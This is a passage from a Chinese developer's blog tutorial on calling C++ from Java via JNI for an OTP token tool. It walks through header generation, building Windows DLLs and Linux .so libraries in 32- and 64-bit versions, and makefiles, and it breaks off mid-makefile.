由于该项目主要运行于Java平台，而出于安全性考虑，我立马就想到了Java易被反编译的缺陷。作为一个安全校验工具，其算法本身才是更重要的。我当机立断就想到了使用C++作为算法的核心编程语言，提供API接口由Java调用（毕竟反汇编比反编译的复杂性要大得多）。 简而言之，安全校验通过C实现，而参数的传递、参数的有效性过滤等则由Java负责。 其实当时也是头脑发热。虽然我Java和C++的功底都相对扎实，但联合编程的经验几乎为0（只是几乎，真的）。不过人总是对依赖太久（其实是YY太久）的东西抱有不切实际的幻想，而当时让足矣支撑我YY的有两点： ① Java必定已经考虑过C的嵌入式开发，绝对有提供相关的API； ② 万事度娘都知道。 就是因为YY了这不切实际的两点，于是我给自己挖了一个大坑，足足填了两个星期...... 虽然过程中也是获益良多，但是为了避免自己重蹈覆辙，也为了大家少走弯路，最终决定写下这篇笔记。 废话说到这里，下面入正题吧。 5. 入坑：JNI 万事开头难，既然才入门，就问问度娘“如何在Java嵌入C编程”吧。 度娘果然很快就回复了： JNI 。 JNI（Java Native Interface），亦即Java本地接口，欲知其原理可点这里。 其操作过程就是： ① 在Java代码用通过 [native] 关键字声明一个本地接口。 ② 通过 [JNI 命令]，生成该接口对应C/C++的头文件 [*.h]。 ③ 编写C/C++程序，实现该接口。 ④ 编译C/C++程序为 [*.dll] 动态链接库，由Java加载调用。 有了操作过程指导，可以开始实践了。 注： 读到这里时，建议先找个简单的HelloWorld实例感受一下JNI， 自己先实践一遍，如果有问题就带着问题，这样读到后面会更易理解。 5.1. navicate 接口定义 新建一个Java项目，随便建一个类（本文以exp.token.otp._OTP_CAPI.class为例），然后声明一个navicat接口即可： package exp.token.otp; /** * * OTP API(c++) * * PROJECT : dynamic-token * SUPPORT : www.exp-blog.com * @version 1.0 # 2015-07-08 * @author EXP: 272629724@qq.com * @since jdk版本：jdk1.6 */ public class _OTP_CAPI { /** * 获取默认私钥. * @return 默认私钥(保密) */ protected static native String getDefaultPrivateKey(); /** * 获取默认时间偏移量. * @return 默认时间偏移量(60000ms) */ protected static native long getDefaultTimeOffset(); /** * 获取动态令牌. * @param privateKey 私钥 * @param timeOffset 时间偏移量(ms) * @return 动态令牌 */ protected static native String getOtpToken( final String privateKey, final long timeOffset); /** * 校验动态令牌是否有效. * @param otpToken 动态令牌 * @param privateKey 私钥 * @return true:有效; false:无效 */ protected static native boolean isValid( final String otpToken, final String privateKey); } 5.2. 执行JNI命令生成C/C++的头文件 JNI命令含义我就不详解了，大家可以自己去问度娘，样例如下： javah -classpath . -jni exp.token.otp._OTP_CAPI 这里有两个要点： 这是 [DOS命令] ，即该命令要求在DOS框内执行 该命令需要在Java的 [编译目录] 下执行 关于Java的 [编译目录] ，相信大部分人都是用Eclipse : Eclipse的普通项目的编译目录是 [./bin] Eclipse的Maven项目的编译目录是 [./target/classes] 运行该命令后，就可以在编译目录下得到一个 [.h] 头文件： exp_token_otp__OTP_CAPI.h 看到这个头文件，接下来就可以转向我们熟悉的C/C++编程了。 5.3. 编写C/C++程序实现接口 围绕 [.h] 头文件，我们要做的就是编写实现的 [.cpp] 代码，再编译成 [.dll] 动态链接库供Java调用。 C/C++的编辑器比较多，我在学生时代最喜欢的就是VC6.0，但到了如今，操作系统早已更新换代了，win7开始对VC6.0的兼容性就非常差，在win8就属于装了也用不了的不稳定状态。而且VC6.0的库也相对过时了，当时我机器上除了VC6.0，就剩下VCExpress，也没多想就用了VCExpress（至于后来为什么改为VS2010，之后会提到）。 我想用C编写 [.exe] 工程的同学比编写 [.dll] 工程的同学多得多，这里简单介绍下如何用VCExpress新建 [.dll] 工程（VS2010是相同的步骤，不用担心）。 如图 1所示，新建项目时选择 [Win32 Project]： 再Next到最后，选择 [DLL] 即可，如图 2所示： 至于dll项目结构我就不介绍了，还需要讲解的说明阁下的C/C++功底不是做嵌入式的时候，先就此打住吧。 接下来把JNI生成的头文件 exp_token_otp__OTP_CAPI.h 放到DLL项目，include并实现它即可，如图 3所示： 至于怎么编写实现代码、怎么生成 [.dll] ，其流程和生成 [.exe] 是一样的，却别在于 [.dll] 是一个 [库程序] ，需要依赖 [宿主程序] 才能运行调试，与 [.exe] 可直接调试相比是麻烦得多了。 我当时是先在 [.exe] 项目调试完程序后，再把代码迁移到 [.dll] 中编译，纵然有点繁琐，也只是最后多了一步而已。 注：VS自身有提供把dll程序附加到宿主进程调试的方法，有兴趣的同学可以问度娘 在这里还有一个细节问题需要注意的，在编译时，可能会出现类似异常： 1>Compiling... 1>stdafx.cpp 1>d:\\workspace\\vc\\dt_otp\\dt_otp\\exp_token_otp__OTP_CAPI.h(2) : fatal error C1083: 无法打开包括文件:\"jni.h\": No such file or directory 1>Build log was saved at \"file://d:\\workspace\\vc\\dt_otp\\dt_otp\\Debug\\BuildLog.htm\" 1>dll_project - 1 error(s), 0 warning(s) ========== Rebuild All: 0 succeeded, 1 failed, 0 skipped ========== 从异常可知，问题出现在 exp_token_otp__OTP_CAPI.h 头文件的第2行，先看一下第2行是什么： /* DO NOT EDIT THIS FILE - it is machine generated */ #include 这里涉及到C/C++的include机制：include的文件用尖括号包围，表示从库目录开始找该文件；用双引号包围，表示从当前目录开始找该文件。 [jni.h] 明显是Java的JNI功能的头文件，找不到可能是环境变量问题导致在库目录找不到，但与其排查环境变量的问题，还不如直接绕过去，将其直接复制到DLL项目的当前目录（与头文件 exp_token_otp__OTP_CAPI.h 同一个目录）就可以了。 注：在后面跨平台调用时会再次改动此文件，复制过来可便于操作。 首先如下修改 exp_token_otp__OTP_CAPI.h 头文件的第2行，即使其查找当前目录的 [jni.h]： #include \"jni.h\" 然后在JDK目录 [%jdk_home%/include] 找到 [jni.h] 文件，复制过来即可。 重新编译，出现新的异常： 1>Compiling... 1>stdafx.cpp 1>d:\\workspace\\vc\\dt_otp\\dt_otp\\jni.h(27) : fatal error C1083: 无法打开包括文件:\"jni_md.h\": No such file or directory 1>Build log was saved at \"file://d:\\workspace\\VC\\Other\\dll_project\\dll_project\\Debug\\BuildLog.htm\" 1>dll_project - 1 error(s), 0 warning(s) ========== Rebuild All: 0 succeeded, 1 failed, 0 skipped ========== 这次问题源于 [jni.h] 第27行所引用的文件丢失： /* jni_md.h contains the machine-dependent typedefs for jbyte, jint and jlong */ #include \"jni_md.h\" 同样，在JDK目录 [%jdk_home%/include/win32] 找到 [jni_md.h] 文件，复制过来，重新编译，编译成功。 注：这里先留一个待处理问题，其实 [jni_md.h] 还存在一个跨平台问题。后面会提到问题原因，并如何解决，这里先略过 5.4. Java加载DLL动态链接库 由VCExpress编译成功的 [.dll] 文件可在C++项目的 [./Debug] 文件下找到。将其复制到Java项目的 [./lib] 目录下（其实任意位置都可以，此处为了举例）。 假如所编译的 [.dll] 文件名为 [dt_otp.dll]，那么在Java有两种加载方式： System.loadLibrary(\"./lib/dt_otp\"); System.load(\"D:/java/dynamic-token/lib/dt_otp.dll\"); 任意选用一种即可，其中： [System.loadLibrary] 指定的是相对路径下的dll库名，不能带后缀 [System.load] 指定的是绝对路径下的dll库文件，必须带后缀 注：建议用 [System.loadLibrary] ，其之所以不能带后缀，是为了跨平台兼容，后面会提及 5.5. 为什么不用JNA ? 这不是本文的重点，本文也没采用过JNA技术，觉得本文信息量太大，可先跳过这节。 JNA（Java Native Access）Java本地访问（传送门），是基于JNI再封装一层的技术。我只看过Demo，没真正用过，所以不莽下评论。 JNA相较于JNI，简化了Java To C的嵌入过程（也仅仅是简化JNI命令、数据类型转换 等步骤，C代码改写还得写）。但缺点是只支持Java To C 的单向调用，不支持C To Java的调用。 至于为什么我没采用JNA，主要是两个原因： ① 当时我还不知道这个东 ② 知道也会选JNI，学习是就应先学底层原理，再学怎么偷懒 不过既然提到Java To C 的 数据类型转换，这里稍微扩充一下： 刚才在通过C实现 JNI生成的 [.h] 头文件的时候，想必都看到过jstring、jlong等等之类的数据类型，这些数据类型其实都在 [jni.h] 头文件中被声明了，需要转换到C/C++的数据类型才能使用。具体怎么转换我就不贴代码了，这不是本文的重点，知道有这回事就可以了。度娘可以找到很多大神的分享，我就贴几个我参考过的传送门： 文献 来源 JNI中java类型与C/C++类型对应关系 传送 Java基础知识——JNI入门介绍 传送 JNI的某些数组和字符串类型转换（转） 传送 JNI高级教程之数据类型转换 传送 [!NOTE|style:flat|label:注意] 数据类型转换要注意的点很多，例如数据截断、内存释放（C不像Java会自动回收）等。 比较隐含的还有不同运行平台的数据位长不同，导致运行结果不一致，等等后面均会提及。 6. 挖坑：跨平台编程 嵌入式编程，需要直面的问题就是 [跨平台] 的问题。 经常用Java的同学可能已经被洗脑了，因为Java属于 [平台无关] 语言，所以在编程、编译时基本不会考虑任何平台特性。但是如果在嵌入了C/C++还不考虑平台特性，你面临的只有进退无路的尴尬境地。 只有做过跨平台编程的同学才会真正了解，[跨平台] 究竟意味着什么： Java是 [跨平台语言]，但同时也是 [平台无关语言] ，所以它 [一次编译，到处运行]。 C/C++是 [跨平台语言]，但它是 [平台相关语言] ，所以它是 [一次编码，到处编译]。 读到本文后面，你会对这两句话有深刻了解。 在上一节经已讲述了从Java生成C/C++接口、到C/C++实现接口、再编译成可被Java加载的DLL库文件的过程。 本节主要讲述Java内嵌C/C++后，跨平台调用若不考虑平台特性会发生的问题，以及如何解决。 6.1. DLL动态链接库的加载与调用 按照前面所述的步骤，我用Java的 [System.loadLibrary] 加载 [dt_otp.dll] 文件所遭遇的第一个问题，就是无法加载，异常如下： java.lang.UnsatisfiedLinkError: ./lib/dt_otp.dll: Can't load IA 32-bit .dll on a AMD 64-bit platform 　　at java.lang.ClassLoader$NativeLibrary.load(Native Method) 　　at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1807) 　　at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1703) 　　at java.lang.Runtime.load0(Runtime.java:770) 　　at java.lang.System.load(System.java:1003) 异常信息很明显了：【无法在64位平台加载32位dll文件】。 当然你遇到的可能是相反的问题， 【无法在32位平台加载64位dll文件】，但问题根源是一样的： java.lang.UnsatisfiedLinkError: ./lib/dt_otp.dll: Can't load AMD 64-bit .dll on a IA 32-bit platform 　　at java.lang.ClassLoader$NativeLibrary.load(Native Method) 　　at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1807) 　　at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1703) 　　at java.lang.Runtime.load0(Runtime.java:770) 　　at java.lang.System.load(System.java:1003) 我马上就想到应该是JDK在作怪了。我是win8_x64的系统，默认使用 JDK是1.6_x64，但异常信息告诉我，我所生成的dll是32位......（至于为什么是32位？下面马上会解谜）。 先不管这个，于是我切换到JDK1.6_x86，重新运行Java程序，果然运行成功。但这个程序的初衷就是放之四海皆可跑的定位，天知道运行它的机器是32位还是64位，这种过份的使用限制条件是不可能被接受的。 既然 [.dll] 文件是32位的，那是否存在64位平台向下兼容运行的方法？于是我带着这个天真的想法搜了度娘的身，但似乎所有的结果都指向一个答案“不存在”（如果有同学知道兼容的方法，请速度联系我）。 64位平台无法兼容32位dll的问题足足困扰了我两天，各种失败的尝试终究使我不得不放弃。于是我开始寻求另一个切入点： 同时编译32和64位版本的dll，由Java判定操作系统位数后再加载 以后的事实证明，我这个想法是正确的，但这也是我挖坑的开始。。。 [!NOTE|style:flat|label:注意] N-bit平台只支持N-bit库，别人口里所谓的 [兼容] 都是因为他有多个库文件。 在64位的windows系统中，除了自身的C:\\Windows\\SysWOW64之外还要保留以前32位系统的C:\\Windows\\System32，以兼容32位程序的运行，就很好地证明了这个道理。 6.2. DLL的编译（x86与x64） 既然确定了目标是生成32-bit和64-bit两个版本的dll，马上就着手编译。 但首先困扰我并不得不先解决的是，为什么我是64位的系统，编译出来的是32位dll？ 注：这其实是一个误区，64位操作系统不是编译64位程序的必要条件，只需有64位编译器即可，这也是 [交叉编译工具] 之所以存在的理由。当然这是后话。 度娘说是GCC编译器的问题，VCExpress可以在 [Build] -> [Configuration Manager] 菜单中查看当前所用的编译器位数，我查了一下，果然是32位，如图 4所示： 但当我想切换到64位编译环境时，发现VCExpress只包含32位编译器。而且最杯具的是VCExpress不允许安装64位编译器（各种的找插件、重新安装VCExpress等等又浪费了我大半天）。 最后我不得不寻求VS2010的帮助（这也是我切换到VS2010的理由），因为它能同时编译出32和64位的DLL文件（事实上更新版本的VS也具备此功能，只是我个人不习惯太新的C/C++库而已）。值得安慰的是VS2010可以直接导入VCExpress的项目，省了不少功夫。 至于如何安装VS2010可参考这里，这里主要记得在安装时选择 [64位编译工具]，如图 5所示： 然后在编译时切换到x64平台（若没有选项则直接 [新建] 一个即可），就可以编译出64位的dll了，如图 6所示： 发现 VS2010所编译的32位dll在C++项目 [./Debug/] 目录下，编译的64位dll在C项目 [./x64/Debug/] 目录下。分别用 JDK1.6_x86 和 JDK1.6_x64 加载，成功！ [!NOTE|style:flat|label:后话] 如果有安装Cygwin且部署好了win版x86和x64的 [交叉编译工具链]，就可以直接通过g++命令编译出32和64位的dll。 但[交叉编译工具链]的安装过于繁琐，且在Cygwin上编写C也不方便，图省事的同学还是像我一样直接用VS2010吧。 6.3. 乱入的ELF头 到目前为止，程序已经可以在win平台下运行成功了。以为大功告成的我，直接就把程序放到Linux平台上试水，毕竟双系统支持才是最终目标。 其实当时也是有点小弱鸡，一如既往地被Java洗脑了。我虽知道这是一个嵌入了C/C++的Java程序，但是脑子了净想着Java的好处：“既然dll库是Java负责加载的，那么Java肯定已经屏蔽了dll的平台差异性，只要win下可以跑，那只要有JVM，这程序放到哪里都能跑了。” 于是Linux当着Java的面给了我响亮的一巴掌清醒清醒：尼mǎ这是 [dll] !。 [!NOTE|style:flat|label:科普] 好吧，科普君又来了： DLL（ Dynamic Link Library ）亦即动态链接库，就是在程序运行过程中才加载进来的。 如果Java君是在编译时将其一同静态编译进代码的，理论上是能够直接在Linux上运行的。 但这是DLL，强如Java也只能在运行时加载。 而当我们在Linux平台上跑Java时，Linux不能识别win的DLL，Java也就不能动态加载。 多说无益，先看看我在Linux上直接加载dll出现的问题： java.lang.UnsatisfiedLinkError: ./lib/dt_otp_x64.dll : invalid ELF header (Possible cause: endianness mismatch) 　　at java.lang.ClassLoader$NativeLibrary.load(Native Method) 　　at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1807) 　　at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1703) 　　at java.lang.Runtime.load0(Runtime.java:770) 　　at java.lang.System.load(System.java:1003) 无效ELF头？ELF头是什么？ 度娘说ELF（Executable and Linkable Format）即可执行连接格式，是Unix为应用程序的二进制接口发布的（这里有简介）。其实简单来说，ELF就是Linux中文件对自身的自述声明，Linux下可通过file命令可以查看其信息： $ file dt_otp_x86.dll dt_otp_x86.dll:PE32 executable (DLL) (GUI) Intel 80386, for MS Windows $ file dt_otp_x64.dll dt_otp_x64.dll:PE32+ executable (DLL) (GUI) x86-64, for MS Windows 果不其然，我在VS2010编译的两份dll文件均是 [for MS Windows]，且分别声明了属于x86-bit还是x64-bit。 6.4. SO也是动态连接库 但知道了ELF头的存在，也只是知道了java在Linux加载DLL会报错的原因，未能切实解决问题。 按照我既往的思维逻辑，我又去抱度娘大腿了：“告诉我怎么在Linux加载DLL的方法吧....”。这次连度娘都无语了。最后还是那些令我惊呆了的小伙伴给了我一个切入点： dll是win平台的动态链接库，so是Linux平台的动态链接库 这回真是 “soですね （原来如此）”了。 so（Shared Object）亦即共享对象（科普可参看这里、这里或这里），等价于win平台的动态链接库。既然如此，又有了win的经验，要解决这个问题的方法就找到了： 再编译Linux平台的32-bit和64-bit版本的so动态链接库 我不敢说这是最好的、唯一的解决方法，但这是我当时能想到的解决方案。 读到这里的同学大概也开始了解我一开始在前面所说的两句话是什么意思了： Java是 [跨平台语言]，但同时也是 [平台无关语言] ，所以它 [一次编译，到处运行]。 C/C++是 [跨平台语言]，但它是 [平台相关语言] ，所以它是 [一次编码，到处编译]。 6.5.编译SO动态链接库（x64） 这部分对于有过Linux开发经验的同学就相对熟悉了，在C/C++源码目录下，执行这条GCC命令就可以编译 [.o] 目标文件： $ g++ -c *.cpp 这里插句话，我当时的Linux编译环境是 Ubuntu14_x64, GCC 4.9.2。 于是我把VS2010的dll项目工程上传到Linux机器，在项目的源码目录内执行前面的g++命令，结果一堆莫名的报错，但其中关键的有几处重复报错： jnimd.h:17:31: error: expected constructor, destructor, or type conversion before 　　#define JNIIMPORT \\_declspec(dllimport) jnimd.h:16:31: error: expected constructor, destructor, or type conversion before 　　#define JNIEXPORT \\_declspec(dllexport) jni.h:1926:1: note: in expansion of macro JNIEXPORT 　　JNIEXPORT jint JNICALL 从异常信息中挖掘关键字，隐约可以知道是 [jni.h] 这个文件的一些宏定义错误，而这些宏定义源于 [jni_md.h] 文件。 打开 [jni_md.h] 文件，确实发现有3个相同的宏定义代码： #define JNIEXPORT __declspec(dllexport) #define JNIIMPORT __declspec(dllimport) #define JNICALL __stdcall 同时打开 [jni.h] ，发现有多处用到了这些宏定义： jobject (JNICALL *NewGlobalRef) (JNIEnv *env, jobject lobj); void (JNICALL *DeleteGlobalRef) (JNIEnv *env, jobject gref); 其实当时我看到 [dllexport] 和 [dllimport] 就知道有猫腻了，[dll] 不就是win的东西吗？ Linux肯定不支持啊，但这个问题我想了很久也不得其解：“这是JNI提供的头文件，按道理不可能会出这种明知故犯的缺陷。况且如果 [dllexport] 和 [dllimport] 有问题，我该怎么改呢？” 当机立断找度娘给自己科普了一下，原来 __declspec(dllexport) 是用于声明哪些函数可以导出（即对外使用），但仅限于win平台（科普看这里）；而相对地，Linux则默认所有函数都是public的，即可以导出而无需声明，不过Linux有一个相似的声明 __attribute__((visibility(\"hidden\"))) 可以隐藏函数使其不能导出（科普看这里）。 但科普了这些其实也是 然并卵，怎么改还是毫无头绪。而且当时我心里还有一份执念就是：“尽然因为平台的特性问题，C/C++程序我至少要编译4个版本（win两个、Linux两个），但代码必须只能有一份。” 后来我才灵机一动， [jni.h] 和 [jni_md.h] 都是我在win的JDK下面复制的，会不会Linux有不同的版本？！ 果不其然！ 先看看win和Linux这两个文件的位置比较： 平台 文件 位置 win jni.h %jdk_home%/include win jni_md.h %jdk_home%/include/win32 Linux jni.h %jdk_home%/include Linux jni_md.h %jdk_home%/include/linux 再对比文件内容， [jni.h] 是相同的，但是Linux版本下 [jni_md.h] 的这三个宏定义变成了这样： #define JNIEXPORT #define JNIIMPORT #define JNICALL 那么为了同时兼顾win和Linux，可以直接修改 [jni_md.h] ，添加开关宏： #ifdef _WIN32 #define JNIEXPORT __declspec(dllexport) #define JNIIMPORT __declspec(dllimport) #define JNICALL __stdcall #else #define JNIEXPORT #define JNIIMPORT #define JNICALL #endif 重新执行g++命令编译，虽然还是报错，但是宏错误的问题已经消失：   stdafx.h:13:85: fatal error: windows.h: No such file or directory 　　#include 其实有了前面的经验，这个问题也变得很好解决了。VS2010在创建非空的dll工程的时候，会自动生成 [stdafx.h] 头文件，并把 包含进来，修改 [stdafx.h] ，同样地添加开关宏即可： #ifdef _WIN32 #include #endif [!NOTE|style:flat|label:后话] 实际上 #include 的问题远没有这么简单就解决了。 当时我的程序没有考虑到Linux环境的问题，不少地方引用了win的API，所以要一个个位置排查并修改为与WinAPI无关的代码，着实费了不少时间。 重新执行g++命令编译，又报了新的错误，而且是项目的dllmain函数报错： dllmain.cpp:13:2: error: BOOL does not name a type 　　BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) 这个错误是因为我刚才在Linux下屏蔽了 [#include ] 引起的。实际上Linux编译的so文件无需用到dll的main函数，修改 [dllmain.cpp] （这个文件同样是VS2010在创建非空的dll工程时自动生成的），同样地为其添加开关宏即可： #ifdef _WIN32 #include \"stdafx.h\" BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } #endif [!NOTE|style:flat|label:注意] dllmain.cpp的问题有更好的方法去处理，就是编写 makefile 脚本。 只要在构建时不将其添加进来，自然就不会编译它了。 其他不需被Linux编译的、或仅用于测试的cpp文件，也可以通过此方式过滤。 重新执行g++命令编译，这次终于没有报错了，而且每份 [*.cpp] 源码都多了一份对应的 [*.o] 目标文件，如图 7所示。至此编译so动态链接库的第一步完成。 最后执行以下命令生成so动态链接库： $ g++ -shared -o dt_otp.so *.o 但是Linux还是很不友善地报错了： /usr/bin/ld: dtotp.o: relocation R_X86_64_32 against '\\_gxx_personality_v0' can not be used when making a shared object; recompile with -fPIC dt_otp.o: error adding symbols: Bad value collect2: error: ld returned 1 exit status 这个异常还是比较易懂的，就是说无法构造一个 [.so] 文件，请用 [-fPIC] 参数重新编译。度娘说 [-fPIC] 的作用是为了构造 [位置无关] 的程序，我想想也合理，毕竟是动态链接库。 加入 [-fPIC] 参数重新执行编译和构建命令，成功创建 [.so] 文件： $ g++ -fPIC -c *.cpp $ g++ -fPIC -shared -o dt_otp.so *.o 马上使用file命令查看其ELF头信息： $ file dt_otp.dll dt_otp.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=8aa563514fb87d53815814d00f3387e1dca18a7e, not stripped 看到这段ELF头信息，我内心是窃喜的 ~ 因为不再是 [for MS Windows] 了。 马上让Java程序引用该so动态链接库（引用方式与dll相同），成功！ 6.6.编译SO动态链接库（x86） 但问题又来了，还差一份32-bit的so库文件，我在64位的Linux应该如何编译出来呢？ 度娘说GCC所编译的文件位数默认与GCC编译器的位数相同，查了一下本地GCC版本信息，果然是64-bit的： $ g++ -v COLLECT_GCC=g++ COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/4.9/lto-wrapper Target: x86_64-linux-gnu ... gcc version 4.9.2 (Ubuntu 4.9.2-10ubuntu13) 度娘还说，要想控制所编译的文件的位数，只需在g++命令中加入声明参数 [-m32] 或 [-m64] 即可。 但是我添加 [-m32] 参数后，编译又报错了： $ g++ -m32 -fPIC -c *.cpp /usr/include/features.h:364:25: fatal error: sys/cdefs.h: No such file or directory #include /usr/include/c++/4.9/exception:37:28: fatal error: bits/c++config.h: No such file or directory #include 其实这个错误还是比较好解决的，原因是我的64位Ubuntu只有64位GCC编译环境，没有32位的GCC编译环境（其实和最开始我在win的VCExpress中遇到没有64位编译器的道理是一样的）。那么安装一个32位的GCC编译器就OK了，而Ubuntu的好处就是只需两条命令就可完成安装： $ sudo apt-get install lib32readline-gplv2-dev $ sudo apt-get install gcc-multilib g++-multilib 其中，第一条命令是安装32位的兼容库，第二条命令是安装32位GCC编译器。其他Linux系统的同学请自己去问度娘怎么安装（这里是Ubuntu的安装方法）。 编译32-bit的 [*.o] 目标文件成功后，则可用以下创建 [so] 文件： $ g++ -m32 -fPIC -shared -o dt_otp_x86.so *.o 再来看看其ELF头信息： $ file dt_otp_x86.dll dt_otp_x86.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, BuildID[sha1]=7343d60222fded19f18cbdaa0d24d0d0949bd4cd, not stripped 马上让Java程序引用该so动态链接库（注意要用32位JDK），成功！ 6.7. SO的编译小结（x86与x64） 由于关于SO的内容比较多，这里小结一下。 生成64-bit的 [so] 动态连接库文件的命令是： $ g++ -m64 -fPIC -c *.cpp $ g++ -m64 -fPIC -shared -o [so库名].so *.o 生成32-bit的 [so] 动态连接库文件的命令是： $ g++ -m32 -fPIC -c *.cpp $ g++ -m32 -fPIC -shared -o [so库名].so *.o 有其他前辈已经归纳得比较详尽了，有兴趣的同学也不妨跳过去看看。 6.8. make构建更优雅 前面介绍了如何把 [*.cpp] 生成 [so] 的过程，但是比较无脑，把所有 cpp 一股脑全部编译进去了，其实不必要，而且项目太大的话还浪费编译时间。 为了使得编译过程显得更优雅，完全可以编写一份makefile脚本，然后通过make命令构建（不懂make的同学点这里或者问度娘）。 下面为我最终为编写的makefile脚本（本文最后会提供下载），脚本一共三份： make.sh、makefile_x64、makefile_x86： #!/bin/bash # == make.sh == export lib_x64=dt_otp_x64.so export mf_x64=makefile_x64 export lib_x86=dt_otp_x86.so export mf_x86=makefile_x86 echo \"=======================================\" echo \"make ${lib_x64} start: \" make --file=${mf_x64} all make --file=${mf_x64} clean echo \"make ${lib_x64} end. \" file ${lib_x64} echo \"=======================================\" echo \".\" echo \"=======================================\" echo \"make ${lib_x86} start: \" make --file=${mf_x86} all make --file=${mf_x86} clean echo \"make ${lib_x86} end. \" file ${lib_x86} echo \"=======================================\" # == makefile for : dt_otp_x64.so == # ------- # Variable declaration : # ------- TAR_LIB_NAME := dt_otp_x64.so O_MAIN_OBJS := dllmain.o dt_otp.o otp_impl.o O_ALGORITHM_OBJS := md5.o digital_watermark.o O_UTIL_OBJS := crypto_utils.o jni_utils.o str_utils.o num_utils.o time_utils.o O_ALL_OBJS := $(O_MAIN_OBJS) $(O_ALGORITHM_OBJS) $(O_UTIL_OBJS) COMPILE_CMD := g++ -m64 -fPIC # ------- # Build libary : # ------- all : $(TAR_LIB_NAME) $(TAR_LIB_NAME) : $(O_ALL_OBJS) @$(COMPILE_CMD) -shared -o $(TAR_LIB_NAME) $(O_ALL_OBJS) @echo \"> Build [$(TAR_LIB_NAME)] finish.\" dllmain.o : dllmain.cpp stdafx.h targetver.h @$(COMPILE_CMD) -c dllmain.cpp -o dllmain.o @echo \"> Compile [dllmain.o] finish.\" dt_otp.o : dt_otp.cpp dt_otp.h otp_impl.h jni_utils.h exp_token_otp__OTP_CAPI.h jni.h jni_md.h stdafx.h targetver.h @$(COMPILE_CMD) -c dt_otp.cpp -o dt_otp.o @echo \"> Compile [dt_otp.o] finish.\" otp_impl.o : otp_impl.cpp otp_impl.h num_utils.h str_utils.h time_utils.h crypto_utils.h stdafx.h targetver.h @$(COMPILE_CMD) -c otp_impl.cpp -o otp_impl.o @echo \"> Compile [otp_impl.o] finish.\" md5.o : md5.cpp md5.h stdafx.h targetver.h @$(COMPILE_CMD) -c md5.cpp -o md5.o @echo \"> Compile [md5.o] finish.\" digital_watermark.o : digital_watermark.cpp digital_watermark.h str_utils.h stdafx.h targetver.h @$(COMPILE_CMD) -c digital_watermark.cpp -o digital_watermark.o @echo \"> Compile [digital_watermark.o] finish.\" crypto_utils.o : crypto_utils.cpp crypto_utils.h str_utils.h md5.h digital_watermark.h stdafx.h targetver.h @$(COMPILE_CMD) -c crypto_utils.cpp -o crypto_utils.o @echo \"> Compile [crypto_utils.o] finish.\" jni_utils.o : jni_utils.cpp jni_utils.h str_utils.h stdafx.h targetver.h @$(COMPILE_CMD) -c jni_utils.cpp -o jni_utils.o @echo \"> Compile [jni_utils.o] finish.\" num_utils.o : num_utils.cpp num_utils.h str_utils.h stdafx.h targetver.h @$(COMPILE_CMD) -c num_utils.cpp -o num_utils.o @echo \"> Compile [num_utils.o] finish.\" str_utils.o : str_utils.cpp str_utils.h stdafx.h targetver.h @$(COMPILE_CMD) -c str_utils.cpp -o str_utils.o @echo \"> Compile [str_utils.o] finish.\" time_utils.o : time_utils.cpp time_utils.h stdafx.h targetver.h @$(COMPILE_CMD) -c time_utils.cpp -o time_utils.o @echo \"> Compile [time_utils.o] finish.\" clean: @rm -f $(O_ALL_OBJS) @echo \"> Clean [*.o] finish.\" # == makefile for : dt_otp_x86.so == # ------- # Variable declaration : # ------- TAR_LIB_NAME := dt_otp_x86.so O_MAIN_OBJS := dllmain.o dt_otp.o otp_impl.o O_ALGORITHM_OBJS := md5.o digital_watermark.o O_UTIL_OBJS := crypto_utils.o jni_utils.o str_utils.o num_utils.o time_utils.o O_ALL_OBJS := $(O_MAIN_OBJS) $(O_ALGORITHM_OBJS) $(O_UTIL_OBJS) COMPILE_CMD := g++ -m32 -fPIC # ------- # Build libary : # ------- all : $(TAR_LIB_NAME) $(TAR_LIB_NAME) : $(O_ALL_OBJS) @$(COMPILE_CMD) -shared -o $(TAR_LIB_NAME) $(O_ALL_OBJS) @echo \"> Build [$(TAR_LIB_NAME)] finish.\" dllmain.o : dllmain.cpp stdafx.h targetver.h @$(COMPILE_CMD) -c dllmain.cpp -o dllmain.o @echo \"> Compile [dllmain.o] finish.\" dt_otp.o : dt_otp.cpp dt_otp.h otp_impl.h jni_utils.h exp_token_otp__OTP_CAPI.h jni.h jni_md.h stdafx.h targetver.h @$(COMPILE_CMD) -c dt_otp.cpp -o dt_otp.o @echo \"> Compile [dt_otp.o] finish.\" otp_impl.o : otp_impl.cpp otp_impl.h num_utils.h str_utils.h time_utils.h crypto_utils.h stdafx.h targetver.h @$(COMPILE_CMD) -c otp_impl.cpp -o otp_impl.o @echo \"> Compile [otp_impl.o] finish.\" md5.o : md5.cpp md5.h stdafx.h targetver.h @$(COMPILE_CMD) -c md5.cpp -o md5.o @echo \"> Compile [md5.o] finish.\" digital_watermark.o : digital_watermark.cpp digital_watermark.h str_utils.h stdafx.h targetver.h @$(COMPILE_CMD) -c digital_watermark.cpp -o digital_watermark.o @echo \"> Compile [digital_watermark.o] finish.\" crypto_utils.o : crypto_utils.cpp crypto_utils.h str_utils.h md5.h digital_watermark.h stdafx.h targetver.h @$(COMPILE_CMD) -c crypto_utils.cpp -o crypto_utils.o @echo \"> Compile [crypto_utils.o] finish.\" jni_utils.o : jni_utils.cpp jni_utils.h str_utils.h stdafx.h targetver.h @$(COMPILE_CMD) -c jni_utils.cpp -o jni_utils.o @echo \"> Compile [jni_utils.o] finish.\" num_utils.o : num_utils.cpp num_utils.h str_utils.h stdafx.h targetver.h @$(COMPILE_CMD) -c num_utils.cpp -o num_utils.o @echo \"> Compile [num_utils.o] finish.\" str_utils.o : str_utils.cpp str_utils.h stdafx.h targetver.h @$(COMPILE_CMD) -c str_utils.cpp -o str_utils.o @echo \"> Compile [str_utils.o] finish.\" time_utils.o : 